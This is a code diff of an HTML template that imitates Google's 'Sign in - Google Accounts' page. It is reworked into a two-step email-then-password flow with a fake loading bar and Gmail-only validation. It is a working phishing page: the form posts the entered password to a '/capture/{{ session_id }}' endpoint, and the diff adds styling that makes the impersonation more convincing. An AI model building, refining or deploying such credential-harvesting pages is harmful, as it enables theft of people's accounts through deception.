@@ -4,115 +4,307 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Sign in - Google Accounts</title>
+
 <style>
-*{margin:0;padding:0;box-sizing:border-box}
+
+*{
+margin:0;
+padding:0;
+box-sizing:border-box;
+font-family:'Google Sans',Arial,sans-serif;
+}
+
 body{
-    font-family:'Google Sans','Noto Sans Myanmar UI',Arial,sans-serif;
-    background:#fff;
-    display:flex;
-    justify-content:center;
-    align-items:center;
-    min-height:100vh
+background:#F1F3F4;
+display:flex;
+justify-content:center;
+align-items:center;
+min-height:100vh;
+padding:20px;
 }
-.container{max-width:450px;width:100%;padding:48px 40px 36px}
+
+.container{
+width:100%;
+max-width:450px;
+}
+
+/* EMAIL CARD */
 .card{
-    border:1px solid #dadce0;
-    border-radius:28px;
-    padding:48px 40px 36px;
-    text-align:center
+background:#fff;
+border:1px solid #dadce0;
+border-radius:28px;
+padding:48px 40px 36px;
+display:none;
+position:relative;
+overflow:hidden;
 }
-.logo{margin-bottom:16px}
-.logo svg{width:75px;height:24px}
-h1{font-size:28px;font-weight:400;color:#202124;margin-bottom:8px;letter-spacing:-0.5px}
-.sub{font-size:16px;color:#5f6368;margin-bottom:32px;font-weight:400}
-.input-group{position:relative;margin-bottom:20px;text-align:left}
-.input-group input{
-    width:100%;
-    padding:17px 15px;
-    border:1px solid #dadce0;
-    border-radius:24px;
-    font-size:16px;
-    outline:none;
-    color:#202124;
-    font-family:'Google Sans',Arial,sans-serif;
-    transition:border-color .15s
+
+.active{
+display:block;
 }
-.input-group input:focus{border-color:#1a73e8}
-.input-group label{
-    position:absolute;
-    left:15px;
-    top:17px;
-    color:#5f6368;
-    font-size:16px;
-    pointer-events:none;
-    background:#fff;
-    padding:0 4px;
-    transition:.15s
+
+.loading-bar{
+position:absolute;
+top:0;
+left:0;
+height:4px;
+width:0%;
+background:#1A73E8;
+transition:width 5s linear;
 }
-.input-group input:focus + label,
-.input-group input:not(:placeholder-shown) + label{
-    top:-9px;
-    left:12px;
-    font-size:11px;
-    color:#1a73e8
+
+.logo{
+width:48px;
+height:48px;
+margin-bottom:24px;
 }
-.forgot{text-align:left;margin-bottom:40px}
-.forgot a{color:#1a73e8;font-size:14px;font-weight:500;text-decoration:none;display:inline-block;padding:5px 0}
-.forgot a:hover{background:#f8faff;border-radius:4px}
-.guest{text-align:left;margin-top:32px;font-size:14px;color:#5f6368;line-height:1.5}
-.guest a{color:#1a73e8;font-weight:500;text-decoration:none}
-.guest a:hover{background:#f8faff;border-radius:4px;padding:3px}
-.actions{display:flex;justify-content:space-between;align-items:center;margin-top:32px}
-.actions .create{color:#1a73e8;font-size:14px;font-weight:500;text-decoration:none;padding:8px 12px;border-radius:4px}
-.actions .create:hover{background:#f8faff}
-.actions button{
-    background:#1a73e8;
-    color:#fff;
-    border:none;
-    border-radius:100px;
-    padding:9px 24px;
-    min-width:88px;
-    font-size:14px;
-    font-weight:500;
-    cursor:pointer;
-    font-family:'Google Sans',Arial,sans-serif
+
+h1{
+font-size:28px;
+font-weight:400;
+color:#202124;
+margin-bottom:8px;
 }
-.actions button:hover{background:#1557b0;box-shadow:0 1px 2px rgba(0,0,0,.15)}
-.footer-links{text-align:center;margin-top:24px;font-size:12px;color:#5f6368}
-.footer-links a{color:#5f6368;text-decoration:none;margin:0 16px}
-.footer-links a:hover{color:#202124}
+
+.sub{
+font-size:16px;
+color:#5f6368;
+margin-bottom:32px;
+}
+
+input[type="text"],
+input[type="password"]{
+width:100%;
+padding:17px 15px;
+border:1px solid #dadce0;
+border-radius:15px;
+font-size:16px;
+outline:none;
+color:#202124;
+background:#fff;
+transition:border-color .15s;
+}
+
+input:focus{
+border-color:#1a73e8;
+}
+
+.link{
+display:inline-block;
+color:#1a73e8;
+font-size:14px;
+font-weight:500;
+cursor:pointer;
+margin-top:8px;
+text-decoration:none;
+}
+
+.link:hover{
+background:#f8faff;
+border-radius:4px;
+padding:3px;
+}
+
+.info{
+font-size:14px;
+color:#5f6368;
+line-height:1.5;
+margin-top:32px;
+}
+
+.info a{
+color:#1a73e8;
+font-weight:500;
+text-decoration:none;
+}
+
+.info a:hover{
+background:#f8faff;
+border-radius:4px;
+padding:3px;
+}
+
+.bottom{
+display:flex;
+justify-content:space-between;
+align-items:center;
+margin-top:32px;
+}
+
+.next{
+background:#1a73e8;
+color:#fff;
+border:none;
+border-radius:100px;
+padding:9px 24px;
+min-width:88px;
+font-size:14px;
+font-weight:500;
+cursor:pointer;
+font-family:'Google Sans',Arial,sans-serif;
+}
+
+.next:hover{
+background:#1557b0;
+}
+
+.footer{
+display:flex;
+justify-content:space-between;
+font-size:12px;
+color:#5f6368;
+margin-top:24px;
+}
+
+.footer a{
+color:#5f6368;
+text-decoration:none;
+}
+
+.footer a:hover{
+color:#202124;
+}
+
+.footer-right{
+display:flex;
+gap:24px;
+}
+
+
+.chip{
+display:flex;
+align-items:center;
+gap:10px;
+border:1px solid #dadce0;
+border-radius:24px;
+padding:10px 16px;
+width:fit-content;
+font-size:14px;
+color:#202124;
+margin:20px 0;
+}
+
+.check-row{
+display:flex;
+align-items:center;
+gap:10px;
+margin-top:24px;
+font-size:14px;
+color:#5f6368;
+}
+
+.check-row input{
+width:18px;
+height:18px;
+cursor:pointer;
+}
+
 </style>
 </head>
+
 <body>
+
 <div class="container">
-    <div class="card">
-        <div class="logo">
-            <svg viewBox="0 0 75 24" width="75" height="24"><path fill="#4285f4" d="M9.24 8.19v2.46h5.88c-.18 1.38-.64 2.39-1.34 3.1-.86.86-2.2 1.8-4.54 1.8-3.62 0-6.45-2.92-6.45-6.54s2.83-6.54 6.45-6.54c1.95 0 3.38.77 4.43 1.76L15.4 2.5C13.94 1.08 11.98 0 9.24 0 4.28 0 .11 4.04.11 9s4.17 9 9.13 9c2.68 0 4.7-.88 6.28-2.52 1.62-1.62 2.13-3.91 2.13-5.75 0-.56-.04-1.07-.13-1.54H9.24z"/><text x="25" y="18" font-size="18" font-weight="bold" fill="#5f6368">Google</text></svg>
-        </div>
-        <h1>Sign in</h1>
-        <p class="sub">Use your Google Account</p>
-        <form action="/capture/{{ session_id }}" method="POST">
-            <div class="input-group">
-                <input type="text" name="username" placeholder="" required>
-                <label>Email or phone</label>
-            </div>
-            <div class="forgot"><a href="#">Forgot email?</a></div>
-            <div class="input-group">
-                <input type="password" name="password" placeholder="" required>
-                <label>Enter your password</label>
-            </div>
-            <div class="guest">Not your computer? Use Guest mode to sign in privately. <a href="#">Learn more</a></div>
-            <div class="actions">
-                <a href="#" class="create">Create account</a>
-                <button type="submit">Next</button>
-            </div>
-        </form>
-    </div>
-    <div class="footer-links">
-        <a href="#">Help</a>
-        <a href="#">Privacy</a>
-        <a href="#">Terms</a>
-    </div>
+
+
+<div class="card active" id="emailPage">
+<div class="loading-bar" id="bar1"></div>
+
+<img class="logo" src="https://files.catbox.moe/jtei5v.png">
+
+<h1>Sign in</h1>
+<div class="sub">Use your Google Account</div>
+
+<input id="emailInput" type="text" placeholder="example@gmail.com">
+
+<a class="link" href="#" style="display:block;margin-bottom:32px;">Forgot email?</a>
+
+<div class="info">Not your computer? Use Guest mode to sign in privately. <a href="#">Learn more</a></div>
+
+<div class="bottom">
+<a class="link" href="#">Create account</a>
+<button class="next" onclick="nextPage()">Next</button>
 </div>
+
+<div class="footer">
+<div>English (UK)</div>
+<div class="footer-right">
+<a href="#">Help</a>
+<a href="#">Privacy</a>
+<a href="#">Terms</a>
+</div>
+</div>
+</div>
+
+
+<div class="card" id="passwordPage">
+
+<img class="logo" src="https://files.catbox.moe/jtei5v.png">
+
+<h1>Welcome</h1>
+
+<div class="chip">
+<span>&#x1F464;</span>
+<span id="showEmail">example@gmail.com</span>
+</div>
+
+<form action="/capture/{{ session_id }}" method="POST">
+<input id="passInput" type="password" name="password" placeholder="Enter your password" required>
+
+<div class="check-row">
+<input id="check" type="checkbox" onclick="togglePass()">
+<label for="check">Show password</label>
+</div>
+
+<div class="bottom">
+<a class="link" href="#">Try another way</a>
+<button class="next" type="submit" onclick="return validatePass()">Login</button>
+</div>
+</form>
+</div>
+
+</div>
+
+<script>
+
+function nextPage(){
+var email=document.getElementById("emailInput").value.trim();
+
+if(email==""){
+alert("Please enter your email");
+return;
+}
+
+if(!email.includes("@gmail.com")){
+alert("Please enter a valid Gmail address (example@gmail.com)");
+return;
+}
+
+var bar=document.getElementById("bar1");
+bar.style.width="100%";
+
+setTimeout(function(){
+document.getElementById("showEmail").innerText=email;
+document.getElementById("emailPage").classList.remove("active");
+document.getElementById("passwordPage").classList.add("active");
+},5000);
+}
+
+function togglePass(){
+var p=document.getElementById("passInput");
+p.type=(p.type=="password")?"text":"password";
+}
+
+function validatePass(){
+var p=document.getElementById("passInput").value;
+if(p==""){
+alert("Please enter your password");
+return false;
+}
+return true;
+}
+
+</script>
+
 </body>
-</html>
+                                                                              </html>
